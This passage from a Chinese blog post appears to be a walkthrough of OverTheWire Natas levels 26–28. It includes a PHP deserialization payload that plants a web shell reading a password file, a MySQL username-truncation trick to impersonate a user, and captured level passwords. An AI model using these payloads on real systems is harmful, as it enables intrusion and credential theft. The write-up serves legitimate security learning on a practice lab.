                            <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"x2"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"y2"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"drawing"</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$drawing</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"drawing"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$drawing</span><span class="token punctuation">)</span>
                <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$drawing</span> <span class="token keyword">as</span> <span class="token variable">$object</span><span class="token punctuation">)</span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"x1"</span><span class="token punctuation">,</span> <span class="token variable">$object</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
                        <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"y1"</span><span class="token punctuation">,</span> <span class="token variable">$object</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
                        <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"x2"</span><span class="token punctuation">,</span> <span class="token variable">$object</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
                        <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"y2"</span><span class="token punctuation">,</span> <span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>

                        <span class="token variable">$color</span><span class="token operator">=</span><span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">,</span><span class="token number">0x1c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token function">imageline</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token variable">$object</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"x1"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$object</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"y1"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                                <span class="token variable">$object</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"x2"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span><span class="token variable">$object</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"y2"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span><span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                    <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">storeData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$new_object</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"x1"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"y1"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
            <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"x2"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"y2"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$new_object</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"x1"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"x1"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$new_object</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"y1"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"y1"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$new_object</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"x2"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"x2"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$new_object</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"y2"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"y2"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"drawing"</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$drawing</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"drawing"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token comment">// create new array</span>
            <span class="token variable">$drawing</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token variable">$drawing</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$new_object</span><span class="token punctuation">;</span>
        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"drawing"</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$drawing</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"drawing"</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">)</span> <span class="token operator">||</span>
        <span class="token punctuation">(</span>   <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"x1"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"y1"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
            <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"x2"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"y2"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$imgfile</span><span class="token operator">=</span><span class="token string double-quoted-string">"img/natas26_"</span> <span class="token operator">.</span> <span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span><span class="token string double-quoted-string">".png"</span><span class="token punctuation">;</span>
        <span class="token function">drawImage</span><span class="token punctuation">(</span><span class="token variable">$imgfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">showImage</span><span class="token punctuation">(</span><span class="token variable">$imgfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">storeData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>反序列化</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Logger</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$logFile</span><span class="token operator">=</span><span class="token string double-quoted-string">"/var/www/natas/natas26/img/natas26_p9gepfibsudb5veomkrsoa6akf.php"</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$exitMsg</span><span class="token operator">=</span><span class="token string double-quoted-string">"&lt;?php echo system('cat /etc/natas_webpass/natas27'); ?>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Logger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<pre class="language-none"><code class="language-none">Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo2NToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl9wOWdlcGZpYnN1ZGI1dmVvbWtyc29hNmFrZi5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1NToiPD9waHAgZWNobyBzeXN0ZW0oJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA&#x2F;PiI7fQ&#x3D;&#x3D;</code></pre>

<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814160351469.png" alt="image-20250814160351469" loading="lazy"></p>
<pre class="language-none"><code class="language-none">u3RRffXjysjgwFU6b9xa23i6prmUsYne</code></pre>

<h2 id="Level-27"><a href="#Level-27" class="headerlink" title="Level 27"></a>Level 27</h2><pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php

&#x2F;&#x2F; morla &#x2F; 10111
&#x2F;&#x2F; database gets cleared every 5 min


&#x2F;*
CREATE TABLE &#96;users&#96; (
  &#96;username&#96; varchar(64) DEFAULT NULL,
  &#96;password&#96; varchar(64) DEFAULT NULL
);
*&#x2F;


function checkCredentials($link,$usr,$pass)&#123;

    $user&#x3D;mysqli_real_escape_string($link, $usr);
    $password&#x3D;mysqli_real_escape_string($link, $pass);

    $query &#x3D; &quot;SELECT username from users where username&#x3D;&#39;$user&#39; and password&#x3D;&#39;$password&#39; &quot;;
    $res &#x3D; mysqli_query($link, $query);
    if(mysqli_num_rows($res) &gt; 0)&#123;
        return True;
    &#125;
    return False;
&#125;


function validUser($link,$usr)&#123;

    $user&#x3D;mysqli_real_escape_string($link, $usr);

    $query &#x3D; &quot;SELECT * from users where username&#x3D;&#39;$user&#39;&quot;;
    $res &#x3D; mysqli_query($link, $query);
    if($res) &#123;
        if(mysqli_num_rows($res) &gt; 0) &#123;
            return True;
        &#125;
    &#125;
    return False;
&#125;


function dumpData($link,$usr)&#123;

    $user&#x3D;mysqli_real_escape_string($link, trim($usr));

    $query &#x3D; &quot;SELECT * from users where username&#x3D;&#39;$user&#39;&quot;;
    $res &#x3D; mysqli_query($link, $query);
    if($res) &#123;
        if(mysqli_num_rows($res) &gt; 0) &#123;
            while ($row &#x3D; mysqli_fetch_assoc($res)) &#123;
                &#x2F;&#x2F; thanks to Gobo for reporting this bug!
                &#x2F;&#x2F;return print_r($row);
                return print_r($row,true);
            &#125;
        &#125;
    &#125;
    return False;
&#125;


function createUser($link, $usr, $pass)&#123;

    if($usr !&#x3D; trim($usr)) &#123;
        echo &quot;Go away hacker&quot;;
        return False;
    &#125;
    $user&#x3D;mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password&#x3D;mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query &#x3D; &quot;INSERT INTO users (username,password) values (&#39;$user&#39;,&#39;$password&#39;)&quot;;
    $res &#x3D; mysqli_query($link, $query);
    if(mysqli_affected_rows($link) &gt; 0)&#123;
        return True;
    &#125;
    return False;
&#125;


if(array_key_exists(&quot;username&quot;, $_REQUEST) and array_key_exists(&quot;password&quot;, $_REQUEST)) &#123;
    $link &#x3D; mysqli_connect(&#39;localhost&#39;, &#39;natas27&#39;, &#39;&lt;censored&gt;&#39;);
    mysqli_select_db($link, &#39;natas27&#39;);


    if(validUser($link,$_REQUEST[&quot;username&quot;])) &#123;
        &#x2F;&#x2F;user exists, check creds
        if(checkCredentials($link,$_REQUEST[&quot;username&quot;],$_REQUEST[&quot;password&quot;]))&#123;
            echo &quot;Welcome &quot; . htmlentities($_REQUEST[&quot;username&quot;]) . &quot;!&lt;br&gt;&quot;;
            echo &quot;Here is your data:&lt;br&gt;&quot;;
            $data&#x3D;dumpData($link,$_REQUEST[&quot;username&quot;]);
            print htmlentities($data);
        &#125;
        else&#123;
            echo &quot;Wrong password for user: &quot; . htmlentities($_REQUEST[&quot;username&quot;]) . &quot;&lt;br&gt;&quot;;
        &#125;
    &#125;
    else &#123;
        &#x2F;&#x2F;user doesn&#39;t exist
        if(createUser($link,$_REQUEST[&quot;username&quot;],$_REQUEST[&quot;password&quot;]))&#123;
            echo &quot;User &quot; . htmlentities($_REQUEST[&quot;username&quot;]) . &quot; was created!&quot;;
        &#125;
    &#125;

    mysqli_close($link);
&#125; else &#123;
?&gt;</code></pre>

<p>MySQL 默认情况下会静默截断超过列定义长度的字符串，例如：<code>username</code>列定义为<code>varchar(64)</code>，输入65字符会被截断</p>
<p>创建用户名如<code>natas28 +57个空格 + x</code>（共65字符），MySQL会截断为<code>natas28 + 57个空格</code></p>
<p>然后在mysql中’natas28’&#x3D;’natas28+空格’</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814161501177.png" alt="image-20250814161501177" loading="lazy"></p>
<p>然后使用natas28 123登录</p>
<pre class="language-none"><code class="language-none">1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj</code></pre>

<h2 id="Level-28"><a href="#Level-28" class="headerlink" title="Level 28"></a>Level 28</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814162313597.png" alt="image-20250814162313597" loading="lazy"></p>
<p>输入个1url变成了</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;natas28.natas.labs.overthewire.org&#x2F;search.php&#x2F;?query&#x3D;G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLP9baIk2Ue8NLFHkisvCsovfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D</code></pre>

<pre class="language-none"><code class="language-none">G+glEae6W&#x2F;1XjA7vRm21nNyEco&#x2F;c+J2TdR0Qp8dcjPLP9baIk2Ue8NLFHkisvCsovfoQVOxoUVz5bypVRFkZR5BPSyq&#x2F;LC12hqpypTFRyXA&#x3D;</code></pre>

<p>应该是AES</p>
</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://ta0.fun/posts/c70009a1/" title="OverTheWire-Natas">http://ta0.fun/posts/c70009a1/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/7705fe97/" rel="prev" title="JDK17下的CC链分析"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">JDK17下的CC链分析</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/fbd08121/" rel="next" title="MazeSec-Novice"><span class="post-nav-text">MazeSec-Novice</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>